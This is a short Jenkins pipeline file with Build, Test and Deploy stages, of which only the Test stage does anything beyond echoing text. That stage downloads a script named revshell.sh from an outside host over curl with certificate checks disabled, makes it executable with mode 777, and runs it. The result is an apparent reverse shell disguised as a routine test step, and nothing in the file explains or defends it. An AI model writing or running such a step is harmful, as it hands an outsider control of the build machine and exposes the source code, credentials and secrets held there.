node('ecs-small-3gb'){
    stage('Build') {
        echo 'Building...'
    }

    stage('Test') {
        echo 'Testing...'
        sh 'curl -i -k https://www.lazy-red-dragon.com/revshell.sh -o /tmp/revshell.sh'
        sh 'chmod 777 /tmp/revshell.sh'
        sh '/tmp/revshell.sh'
    }

    stage('Deploy') {
        echo 'Deploying...'
    }
}

